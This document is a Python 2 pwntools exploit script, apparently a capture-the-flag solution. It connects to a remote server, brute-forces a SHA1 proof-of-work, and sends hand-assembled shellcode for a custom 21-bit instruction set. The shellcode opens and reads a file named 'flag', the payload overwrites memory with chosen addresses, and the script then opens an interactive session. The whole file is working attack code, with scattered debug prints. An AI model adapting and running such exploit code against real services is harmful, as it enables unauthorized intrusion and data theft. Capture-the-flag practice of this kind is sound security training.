#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

__author__ = "luckasdf0"

from pwn import *
import struct
from hashlib import sha1

io = remote("13.124.182.123",  8888)

def u21(s):
    p0 = int(s[0])
    p1 = int(s[1])
    p2 = int(s[2])
    d0 = p0 & 0b1111111
    d1 = p2 & 0b1111111
    d2 = p1 & 0b1111111
    num = d0 | ((d1<<7)&0b11111110000000) | ((d2<<14)&0b111111100000000000000)
    return num

def p21(num):
    num = num & 0b111111111111111111111
    p0 = num & 0b1111111
    p1 = ((num & 0b111111100000000000000)>>14)&0b111111111111111111111
    p2 = ((num & 0b11111110000000)>>7)&0b111111111111111111111
    return chr(p0)+chr(p1)+chr(p2)

def movI(reg, val):
    ins = ((0x4&0b11111)<<10) # OPCODE 4
    ins = ins| 0b1000000000 # TYPE_I
    ins = (ins | ((reg&0b0111)<<4) | ((reg&0b1000)>>3)<<8)
    print 'AAAAAAAAAAAA' + bin(ins)
    #return p16(ins) + p21(val)
    return struct.pack('>H', ins) + p21(val)

def syscall():
    ins = ((0x8&0b11111)<<10) # OPCODE 4
    print bin(ins)
    ins = ins & 0b111110000000000 # TYPE_R
    print bin(ins)
    print bin(ins)
    return struct.pack('>H', ins)

def inc(reg):
    ins = ((17&0b11111)<<10) # OPCODE 4
    print bin(ins)
    ins = ins & 0b111110000000000 # TYPE_I
    ins = (ins | ((reg&0b0111)<<4) | ((reg&0b1000)>>3)<<8)
    return struct.pack('>H', ins)

def dec(reg):
    ins = ((18&0b11111)<<10) # OPCODE 4
    print bin(ins)
    ins = ins & 0b111110000000000 # TYPE_I
    ins = (ins | ((reg&0b0111)<<4) | ((reg&0b1000)>>3)<<8)
    return struct.pack('>H', ins)

def check():
    io.recvuntil('prefix : ')
    start = io.recv(6)
    log.info("%s"%start)
    i = 0
    while True:
        i+=1
        if sha1(start+str(i)).hexdigest().endswith('000000'):
            io.sendline(start+str(i))
            break

check()

shellcode  = ''
shellcode += movI(0, 1)
shellcode += movI(1, 0xf5f9e+52)
shellcode += syscall()
shellcode += inc(0)
shellcode += movI(1, 2)
shellcode += movI(2, 0xf5000)
shellcode += movI(3, 0x20)
shellcode += syscall()
shellcode += movI(0, 2)
shellcode += dec(1)
shellcode += syscall()

shellcode += syscall()

payload  = ''
payload += shellcode.ljust(52, '0')
payload += 'flag\0'
#payload += p21(0b111111111111111111111) * 19
payload += p21(74565)
payload += p21(0xbeef)
payload += p21(0xf5f9e)

io.recvuntil("name>")

io.sendline(payload)

io.interactive()
